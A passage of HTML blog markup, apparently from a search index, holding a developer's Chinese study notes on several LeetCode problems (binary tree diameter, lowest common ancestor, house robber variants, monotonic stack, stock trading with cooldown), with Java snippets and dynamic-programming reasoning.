class="number">1</span>，递归实现反序中序遍历二叉树。先converBST(root.right)，返回后根据本节点值更新sum，再更新本节点值，最后converBST(root.right)即可。</span><br></pre></td></tr></table></figure><h2 id="543、二叉树的直径（11月7日）"><a href="#543、二叉树的直径（11月7日）" class="headerlink" title="543、二叉树的直径（11月7日）"></a>543、二叉树的直径（11月7日）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法，深度优先搜索。这道题比较经典，就是dfs左、右叶子节点，通过Math.max(result[0],left+right)判断经过本根节点的路径，向上返回Math.max(left,right)+1即选左边或者右边。</span><br><span class="line">2.我这里遇到root==null时，会返回当前累计长度len-1，这导致需要一个记录深度的变量deep，本位置的更新转化为Math.max(results[0],(left-deep)+(right-deep));，有点复杂了，实际只需要root==null时返回0，不用记录len和deep。</span><br></pre></td></tr></table></figure><h2 id="236、二叉树的最近公共祖先（11月8日）"><a href="#236、二叉树的最近公共祖先（11月8日）" class="headerlink" title="236、二叉树的最近公共祖先（11月8日）"></a>236、二叉树的最近公共祖先（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，HashMap+HashSet+dfs。首先通过dfs遍历二叉树，按&lt;本节点，本节点的父节点&gt;形式放入hashMap，这样就获知了每个节点的父节点信息。从p开始向上遍历至root节点，将路径中遇到的节点都存入hashSet，然后从q开始向上遍历至root节点，观察路径中的节点是否出现在hashSet，若出现则为最近的公共祖先。（关键词，&lt;本节点，本节点的父节点&gt;）</span><br></pre></td></tr></table></figure><h2 id="617、合并二叉树（11月8日）"><a href="#617、合并二叉树（11月8日）" class="headerlink" title="617、合并二叉树（11月8日）"></a>617、合并二叉树（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历二叉树。这道题和经典广度优先有所差别，也让我有所顾忌。先维护三个队列，分别用于新Tree、root1和root2的广度优先遍历。</span><br><span class="line">    a.以某位置左子节点为例，只有left1和left2都不为<span class="literal">null</span>时，才将其放入各自队列，否则只是连接不为<span class="literal">null</span>的子节点到新Tree，并不放入队列。因为目标是将节点放到新Tree，此时已经把该左子树全都放到新Tree，没有必要继续遍历。</span><br><span class="line">    b.外层循环为 <span class="keyword">while</span>(!tree1.isEmpty()&amp;&amp;!tree2.isEmpty())是和不是或，其实无所谓，上一步已经保证了tree1和tree2在每一时刻都是同步的，相同大小。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，递归实现深度优先遍历。递归实现还是比较简单的，直接在mergeTrees递归。首先，root1.val = root1.val+root2.val;，然后分别对二者左、右子树进行mergeTrees，将返回值分别连接到root1的left指针和right指针，最后返回root1即可。</span><br></pre></td></tr></table></figure><h2 id="198、打家劫舍（11月8日）"><a href="#198、打家劫舍（11月8日）" class="headerlink" title="198、打家劫舍（11月8日）"></a>198、打家劫舍（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。这道题几天前做过，dp[i]表示偷窃第i号房间的最大收益，dp[i]的计算要考虑合法位置，合法位置包括dp[i-<span class="number">2</span>]和dp[i-<span class="number">3</span>]这两种，其中dp[i-<span class="number">3</span>]可以用dp[i-<span class="number">1</span>]-nums[i-<span class="number">1</span>]表示。最后<span class="keyword">return</span> Math.max(dp[n-<span class="number">2</span>],dp[n-<span class="number">1</span>])即可。</span><br></pre></td></tr></table></figure><h2 id="238、除自身以外数组的乘积（11月8日）"><a href="#238、除自身以外数组的乘积（11月8日）" class="headerlink" title="238、除自身以外数组的乘积（11月8日）"></a>238、除自身以外数组的乘积（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，分治法。最简单的想法是双层<span class="keyword">for</span>循环，但是会超越时间限制，然后就只能想到除再没有办法了。题解的思路为，任意位置result[i]=它左边的所有数乘积*它右边的所有数乘积，故通过<span class="keyword">for</span>+<span class="keyword">for</span>维护leftNums、rightNums数组，leftNums[i]表示i以左所有数字的乘积，rightNums[i]表示i以右所有数字的乘积，result[i]=leftNums[i]*rightNums[i]。</span><br></pre></td></tr></table></figure><h2 id="739、每日温度（11月8日）"><a href="#739、每日温度（11月8日）" class="headerlink" title="739、每日温度（11月8日）"></a>739、每日温度（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，单调栈。最简单的想法还是双层<span class="keyword">for</span>循环，但是会超越时间限制。这是一道单调栈的模板题，我用以下思路实现单调栈，突然发现题解也是这样写得，芜湖起飞：</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;   <span class="comment">//如果新元素比栈顶大，就循环弹栈</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="keyword">if</span> (temperatures[i]&gt;temperatures[index])&#123;</span><br><span class="line">                result[index] = i-index;    <span class="comment">//业务逻辑</span></span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(i);   <span class="comment">//遇到新元素不论如何都要压栈</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>再记录一下什么时候想到用单调栈：</span><br><span class="line">    通常是一维数组，要寻找任一个元素的右边或者左边第一个比自己大或者小的元素的位置，此时我们就要想到可以用单调栈了。</span><br></pre></td></tr></table></figure><h2 id="438、找到字符串中所有字母异位词（11月8日）"><a href="#438、找到字符串中所有字母异位词（11月8日）" class="headerlink" title="438、找到字符串中所有字母异位词（11月8日）"></a>438、找到字符串中所有字母异位词（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，滑动窗口。可能很长时间没做滑动窗口了，竟然第一时间没做出来。顾虑主要是如何对比hashMap或者<span class="type">int</span>[]，这里是直接Arrays.equals(countS,countP)比较，那就没啥说的了，就是先在countS和countP中分别放pLen个s和p中的数字，做第一次比较后，再开始通过<span class="keyword">for</span>(<span class="type">int</span> i=pLen;i&lt;sLen;i++)进行滑动窗口逻辑。</span><br><span class="line"><span class="number">2.</span>比较两个<span class="type">int</span>[]数组是否相等，使用Arrays.equals(countS,countP)；那比较两个hashMap数据是否相等该用啥呢？</span><br></pre></td></tr></table></figure><h2 id="337、打家劫舍Ⅲ（11月8日）"><a href="#337、打家劫舍Ⅲ（11月8日）" class="headerlink" title="337、打家劫舍Ⅲ（11月8日）"></a>337、打家劫舍Ⅲ（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，后序dfs+动态规划。每次做到“打家劫舍”系列就顿时感觉到思路巧妙，</span><br><span class="line">  a.“打家劫舍Ⅰ”需要考虑两种合法位置，dp[i] = Math.max(dp[i-<span class="number">1</span>]-nums[i-<span class="number">1</span>],dp[i-<span class="number">2</span>])+nums[i];</span><br><span class="line">  b.“打家劫舍Ⅱ”是环形房屋，需要额外考虑[<span class="number">0</span>,nums.length-<span class="number">2</span>]范围里的最优解和[<span class="number">1</span>,nums.lenght-<span class="number">1</span>]范围里的最优解两种情况；</span><br><span class="line">  c.“打家劫舍Ⅲ”是二叉树房屋，则和“offertwo92翻转字符”类似要分情况讨论，有两个状态转移方程，列一下注释即明白：</span><br><span class="line">Map&lt;TreeNode,Integer&gt; f = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">//选取当前节点后的最大收益</span></span><br><span class="line">Map&lt;TreeNode,Integer&gt; g = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">//放弃当前节点后的最大收益</span></span><br><span class="line"><span class="comment">//如果选择偷盗当前root位置，则收益为放弃其左右子节点的收益之和</span></span><br><span class="line">f.put(root,g.getOrDefault(root.left,<span class="number">0</span>)+g.getOrDefault(root.right,<span class="number">0</span>)+root.val);</span><br><span class="line">    <span class="comment">//如果选择放弃root位置，对于子节点既可以选取，又可以放弃，则收益组成，Math.max(选取左，放弃左)+Math.max(选取右，放弃右)</span></span><br><span class="line">g.put(root,Math.max(f.getOrDefault(root.left,<span class="number">0</span>),g.getOrDefault(root.left,<span class="number">0</span>))</span><br><span class="line">                +Math.max(f.getOrDefault(root.right,<span class="number">0</span>),g.getOrDefault(root.right,<span class="number">0</span>)));</span><br><span class="line"><span class="number">2.</span>本题遍历二叉树时，采用递归dfs实现，需要后序遍历，因为计算根节点收益时，需要知道左子节点和右子节点的收益情况。</span><br></pre></td></tr></table></figure><h2 id="309、最佳买卖股票时机含冷冻期（11月8日）"><a href="#309、最佳买卖股票时机含冷冻期（11月8日）" class="headerlink" title="309、最佳买卖股票时机含冷冻期（11月8日）"></a>309、最佳买卖股票时机含冷冻期（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这是一种新的动态规划题型，转移方程表示最大收益，包括状态和行动分情况讨论，将转移方程列为下式：</span><br><span class="line">    （<span class="number">1</span>）.f[i][<span class="number">0</span>]  <span class="comment">//状态：我们在第i天拥有一支股票  行动：这只股票可以是第i天买入，也可以不是第i天买入</span></span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = -prices[i]</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>: f[i][<span class="number">0</span>] = Math.max(f[i-<span class="number">1</span>][<span class="number">2</span>]-prices[i]，f[i-<span class="number">1</span>][<span class="number">0</span>])   <span class="comment">//前者是第i-1天买入，后者是第i-1天已经持有</span></span><br><span class="line">    （<span class="number">2</span>）.f[i][<span class="number">1</span>]  <span class="comment">//状态：我们在第i天不拥有一张股票  行动：我们在第i天卖掉股票（造成不拥有），造成第i+1天的冷冻期</span></span><br><span class="line">f[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> i!=<span class="number">0</span>: f[i][<span class="number">1</span>] = f[i-<span class="number">1</span>][<span class="number">0</span>]+prices[i]    <span class="comment">//上一状态只能是第i-1天拥有股票</span></span><br><span class="line">（<span class="number">3</span>）.f[i][<span class="number">2</span>]  <span class="comment">//状态：我们在第i天不拥有一张股票  行动：它是（i-1）或以前卖掉的，所以第（i+1）天不存在冷冻期</span></span><br><span class="line">         f[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line">         <span class="keyword">if</span> i!=<span class="number">0</span>: f[i][<span class="number">2</span>] = Math.max(f[i-<span class="number">1</span>][<span class="number">1</span>],f[i-<span class="number">1</span>][<span class="number">2</span>])  <span class="comment">//上一状态是i-1天卖掉造成不拥有，或者更为长期的不拥有</span></span><br><span class="line">  通过上面这些式子，我们可以看到收益的传播，上一状态是非冷冻期不持有的最大收益，则会传播到下一状态购入股票的最大收益。最终返回Math.max(f[n-<span class="number">1</span>][<span class="number">1</span>],f[n-<span class="number">1</span>][<span class="number">2</span>])即可，即股票已经被卖掉了。</span><br><span class="line"><span class="number">2.</span>这道题又和分情况讨论不同，它定义转移方程时，需要从状态和行动考虑，会出现同一状态选择不同的行动。下次再做时估计还是难以想到，不过还是在分析中感受到动态规划的魅力。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
